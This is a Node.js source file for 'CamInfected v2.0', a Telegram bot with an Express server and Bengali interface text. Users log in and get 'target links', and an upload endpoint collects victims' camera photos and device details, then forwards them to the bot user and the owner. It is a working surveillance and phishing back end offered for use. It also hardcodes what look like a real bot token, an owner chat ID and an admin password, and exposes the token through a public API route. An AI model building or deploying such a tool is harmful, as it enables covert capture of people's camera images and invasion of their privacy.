require('dotenv').config();
const express = require('express');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const sqlite3 = require('sqlite3').verbose();
const { open } = require('sqlite');

// ============== কনফিগারেশন ==============
const BOT_TOKEN = '8879628119:AAEhUJ5PJ4zH4jZqG-M229pU_MsZLXrybKo';
const OWNER_CHAT_ID = '8678824835';
const ADMIN_PASSWORD = 'owner@mrvirus460#alamin';
const PORT = process.env.PORT || 3000;

// ============== এক্সপ্রেস অ্যাপ ==============
const app = express();
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ============== SQLite ডাটাবেজ ==============
let db;

async function initDatabase() {
  db = await open({
    filename: './caminfected.db',
    driver: sqlite3.Database
  });
  
  await db.exec(`
    CREATE TABLE IF NOT EXISTS users (
      chatId TEXT PRIMARY KEY,
      username TEXT,
      firstName TEXT,
      lastName TEXT,
      isApproved INTEGER DEFAULT 0,
      isBlocked INTEGER DEFAULT 0,
      referralCode TEXT UNIQUE,
      createdAt DATETIME DEFAULT CURRENT_TIMESTAMP,
      lastActive DATETIME DEFAULT CURRENT_TIMESTAMP,
      totalLinks INTEGER DEFAULT 0,
      totalPhotos INTEGER DEFAULT 0
    )
  `);
  
  await db.exec(`
    CREATE TABLE IF NOT EXISTS photos (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      chatId TEXT,
      userChatId TEXT,
      photoId TEXT,
      fileId TEXT,
      caption TEXT,
      deviceInfo TEXT,
      timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    )
  `);
  
  await db.exec(`
    CREATE TABLE IF NOT EXISTS logs (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      chatId TEXT,
      action TEXT,
      details TEXT,
      timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    )
  `);
  
  console.log('✅ Database ready');
}

function generateReferralCode(chatId) {
  const crypto = require('crypto');
  return crypto.createHash('md5').update(chatId + Date.now()).digest('hex').substring(0, 10);
}

async function logActivity(chatId, action, details = {}) {
  await db.run('INSERT INTO logs (chatId, action, details) VALUES (?, ?, ?)', 
    [chatId, action, JSON.stringify(details)]);
}

async function getUserStats(chatId) {
  const photos = await db.get('SELECT COUNT(*) as count FROM photos WHERE userChatId = ?', [chatId]);
  const user = await db.get('SELECT totalLinks, lastActive FROM users WHERE chatId = ?', [chatId]);
  return {
    totalPhotos: photos?.count || 0,
    totalLinks: user?.totalLinks || 0,
    lastActive: user?.lastActive || new Date()
  };
}

// ============== টেলিগ্রাম বট ==============
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// স্টার্ট কমান্ড
bot.onText(/\/start(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id.toString();
  const username = msg.from?.first_name || '';
  const referralCode = match[1];
  
  let user = await db.get('SELECT * FROM users WHERE chatId = ?', [chatId]);
  
  if (!user) {
    const newReferralCode = generateReferralCode(chatId);
    await db.run(
      'INSERT INTO users (chatId, username, firstName, lastName, referralCode) VALUES (?, ?, ?, ?, ?)',
      [chatId, msg.from?.username || '', msg.from?.first_name || '', msg.from?.last_name || '', newReferralCode]
    );
    
    if (referralCode) {
      const referrer = await db.get('SELECT * FROM users WHERE referralCode = ?', [referralCode]);
      if (referrer) {
        await logActivity(referrer.chatId, 'referral_used', { referredUser: chatId });
        await bot.sendMessage(referrer.chatId, `🎉 নতুন ইউজার আপনার রেফারেল লিংক ব্যবহার করেছে!`);
      }
    }
  }
  
  await bot.sendMessage(chatId, `🎉 *ক্যামইনফেক্টেড বটে স্বাগতম!* 🎉

━━━━━━━━━━━━━━━━━━━━
📸 *CamInfected v2.0*
━━━━━━━━━━━━━━━━━━━━

🔐 *সিস্টেম অ্যাক্সেস পেতে* পাসওয়ার্ড দিন:
\`/login ${ADMIN_PASSWORD}\`

🌐 *রেফারেল লিংক পেতে:* /getlink
📸 *ছবি দেখতে:* /myphotos
📊 *স্ট্যাটাস দেখতে:* /mystatus

━━━━━━━━━━━━━━━━━━━━
👨‍💻 *ডেভেলপার: Mohammad Alamin*
📱 TikTok: @mr_virus_apk
📘 Facebook: Mohammad Alamin
📨 Telegram: @mrvirus460
━━━━━━━━━━━━━━━━━━━━`, { parse_mode: 'Markdown' });
});

// লগইন কমান্ড
bot.onText(/\/login (.+)/, async (msg, match) => {
  const chatId = msg.chat.id.toString();
  const password = match[1];
  
  const user = await db.get('SELECT * FROM users WHERE chatId = ?', [chatId]);
  
  if (user && user.isBlocked === 1) {
    await bot.sendMessage(chatId, `❌ *আপনাকে ব্লক করা হয়েছে!* যোগাযোগ করুন: @mrvirus460`, { parse_mode: 'Markdown' });
    return;
  }
  
  if (password === ADMIN_PASSWORD) {
    await db.run('UPDATE users SET isApproved = 1, lastActive = CURRENT_TIMESTAMP WHERE chatId = ?', [chatId]);
    await logActivity(chatId, 'login_success');
    
    const link = `https://your-server.onrender.com/?chat_id=${chatId}`;
    
    await bot.sendMessage(chatId, `✅ *লগইন সফল!*

🔗 *আপনার টার্গেট লিংক:*
\`${link}\`

📸 *ছবি দেখতে:* /myphotos
🔗 *নতুন লিংক:* /getlink`, { parse_mode: 'Markdown' });
  } else {
    await logActivity(chatId, 'login_failed', { password: password });
    await bot.sendMessage(chatId, `❌ *ভুল পাসওয়ার্ড!* যোগাযোগ করুন: @mrvirus460`, { parse_mode: 'Markdown' });
  }
});

// গেট লিংক কমান্ড
bot.onText(/\/getlink/, async (msg) => {
  const chatId = msg.chat.id.toString();
  const user = await db.get('SELECT * FROM users WHERE chatId = ?', [chatId]);
  
  if (!user || user.isApproved !== 1) {
    await bot.sendMessage(chatId, `❌ প্রথমে লগইন করুন! /login`);
    return;
  }
  
  if (user.isBlocked === 1) {
    await bot.sendMessage(chatId, `❌ আপনি ব্লক করা হয়েছেন!`);
    return;
  }
  
  const link = `https://your-server.onrender.com/?chat_id=${chatId}`;
  
  await db.run('UPDATE users SET totalLinks = totalLinks + 1, lastActive = CURRENT_TIMESTAMP WHERE chatId = ?', [chatId]);
  await logActivity(chatId, 'link_generated');
  
  await bot.sendMessage(chatId, `🔗 *আপনার টার্গেট লিংক:*\n\`${link}\``, { parse_mode: 'Markdown' });
});

// মাই ফটোস কমান্ড
bot.onText(/\/myphotos/, async (msg) => {
  const chatId = msg.chat.id.toString();
  const user = await db.get('SELECT * FROM users WHERE chatId = ?', [chatId]);
  
  if (!user || user.isApproved !== 1) {
    await bot.sendMessage(chatId, `❌ প্রথমে লগইন করুন! /login`);
    return;
  }
  
  if (user.isBlocked === 1) {
    await bot.sendMessage(chatId, `❌ আপনি ব্লক করা হয়েছেন!`);
    return;
  }
  
  const photos = await db.all('SELECT * FROM photos WHERE userChatId = ? ORDER BY timestamp DESC LIMIT 20', [chatId]);
  
  if (photos.length === 0) {
    await bot.sendMessage(chatId, `📸 এখনো কোনো ছবি নেই।`);
    return;
  }
  
  await bot.sendMessage(chatId, `📸 *আপনার ${photos.length}টি ছবি:*`, { parse_mode: 'Markdown' });
  
  for (const photo of photos) {
    try {
      let deviceInfo = {};
      try { deviceInfo = JSON.parse(photo.deviceInfo || '{}'); } catch(e) {}
      
      await bot.sendPhoto(chatId, photo.fileId, {
        caption: `📸 *ছবি:* ${photo.photoId}\n⏰ *সময়:* ${new Date(photo.timestamp).toLocaleString('bn-BD')}\n📱 *ডিভাইস:* ${deviceInfo?.browser || 'N/A'}`
      });
    } catch(e) {
      console.error('Error:', e);
    }
  }
});

// মাই স্ট্যাটাস কমান্ড
bot.onText(/\/mystatus/, async (msg) => {
  const chatId = msg.chat.id.toString();
  const user = await db.get('SELECT * FROM users WHERE chatId = ?', [chatId]);
  const stats = await getUserStats(chatId);
  
  await bot.sendMessage(chatId, `📊 *স্ট্যাটাস*
✅ স্ট্যাটাস: ${user?.isApproved === 1 ? 'অ্যাক্টিভ' : 'ইনঅ্যাক্টিভ'}
📸 মোট ছবি: ${stats.totalPhotos}
🔗 মোট লিংক: ${stats.totalLinks}
🕐 শেষ অ্যাক্টিভ: ${new Date(stats.lastActive).toLocaleString('bn-BD')}`, { parse_mode: 'Markdown' });
});

// হেল্প কমান্ড
bot.onText(/\/help/, async (msg) => {
  await bot.sendMessage(msg.chat.id, `📌 *কমান্ড লিস্ট*
/login পাসওয়ার্ড - লগইন
/getlink - লিংক তৈরি
/myphotos - ছবি দেখা
/mystatus - স্ট্যাটাস
/help - এই সাহায্য

👨‍💻 সাপোর্ট: @mrvirus460`, { parse_mode: 'Markdown' });
});

// ওনার প্যানেল
bot.onText(/\/admin/, async (msg) => {
  if (msg.chat.id.toString() !== OWNER_CHAT_ID) return;
  
  const totalUsers = await db.get('SELECT COUNT(*) as count FROM users');
  const approvedUsers = await db.get('SELECT COUNT(*) as count FROM users WHERE isApproved = 1');
  const blockedUsers = await db.get('SELECT COUNT(*) as count FROM users WHERE isBlocked = 1');
  const totalPhotos = await db.get('SELECT COUNT(*) as count FROM photos');
  
  await bot.sendMessage(OWNER_CHAT_ID, `👑 *অ্যাডমিন প্যানেল*
👥 মোট ইউজার: ${totalUsers.count}
✅ অ্যাপ্রুভড: ${approvedUsers.count}
🔴 ব্লকড: ${blockedUsers.count}
📸 মোট ছবি: ${totalPhotos.count}

\`/users\` - ইউজার লিস্ট
\`/block [chatId]\` - ব্লক করুন
\`/unblock [chatId]\` - আনব্লক করুন`, { parse_mode: 'Markdown' });
});

bot.onText(/\/users/, async (msg) => {
  if (msg.chat.id.toString() !== OWNER_CHAT_ID) return;
  
  const users = await db.all('SELECT * FROM users ORDER BY createdAt DESC LIMIT 20');
  let list = '👥 *ইউজার লিস্ট*\n━━━━━━━━━━━━━━━━━━━━\n';
  for (const u of users) {
    list += `🆔 ${u.chatId}\n👤 ${u.firstName || 'N/A'} @${u.username || 'N/A'}\n✅ ${u.isApproved ? '✓' : '✗'} | 🔒 ${u.isBlocked ? '🔴' : '⚪'}\n━━━━━━━━━━━━━━━━━━━━\n`;
  }
  await bot.sendMessage(OWNER_CHAT_ID, list, { parse_mode: 'Markdown' });
});

bot.onText(/\/block (.+)/, async (msg, match) => {
  if (msg.chat.id.toString() !== OWNER_CHAT_ID) return;
  const target = match[1];
  await db.run('UPDATE users SET isBlocked = 1 WHERE chatId = ?', [target]);
  await bot.sendMessage(OWNER_CHAT_ID, `✅ ব্লক করা হয়েছে: ${target}`);
});

bot.onText(/\/unblock (.+)/, async (msg, match) => {
  if (msg.chat.id.toString() !== OWNER_CHAT_ID) return;
  const target = match[1];
  await db.run('UPDATE users SET isBlocked = 0 WHERE chatId = ?', [target]);
  await bot.sendMessage(OWNER_CHAT_ID, `✅ আনব্লক করা হয়েছে: ${target}`);
});

// ============== API এন্ডপয়েন্ট ==============
app.get('/api/bot-info', (req, res) => {
  res.json({ botToken: BOT_TOKEN, ownerChatId: OWNER_CHAT_ID });
});

app.post('/api/upload-photo', async (req, res) => {
  const { chatId, photoId, fileId, caption, deviceInfo } = req.body;
  
  if (!chatId || !photoId || !fileId) {
    return res.status(400).json({ error: 'Missing fields' });
  }
  
  try {
    await db.run(
      'INSERT INTO photos (chatId, userChatId, photoId, fileId, caption, deviceInfo) VALUES (?, ?, ?, ?, ?, ?)',
      [chatId, chatId, photoId, fileId, caption || '', JSON.stringify(deviceInfo || {})]
    );
    
    await bot.sendMessage(OWNER_CHAT_ID, `📸 *নতুন ছবি!*\n🆔 ${chatId}\n⏰ ${new Date().toLocaleString('bn-BD')}`, { parse_mode: 'Markdown' });
    
    const user = await db.get('SELECT * FROM users WHERE chatId = ?', [chatId]);
    if (user && user.isApproved === 1 && user.isBlocked !== 1) {
      await bot.sendMessage(chatId, `📸 *নতুন ছবি এসেছে!*\n/myphotos দেখুন।`, { parse_mode: 'Markdown' });
    }
    
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: 'Error' });
  }
});

app.get('/api/health', (req, res) => {
  res.json({ status: 'ok' });
});

// ============== সার্ভার স্টার্ট ==============
async function startServer() {
  await initDatabase();
  app.listen(PORT, () => {
    console.log(`✅ Server: http://localhost:${PORT}`);
    console.log(`🤖 Bot is running`);
  });
}

startServer();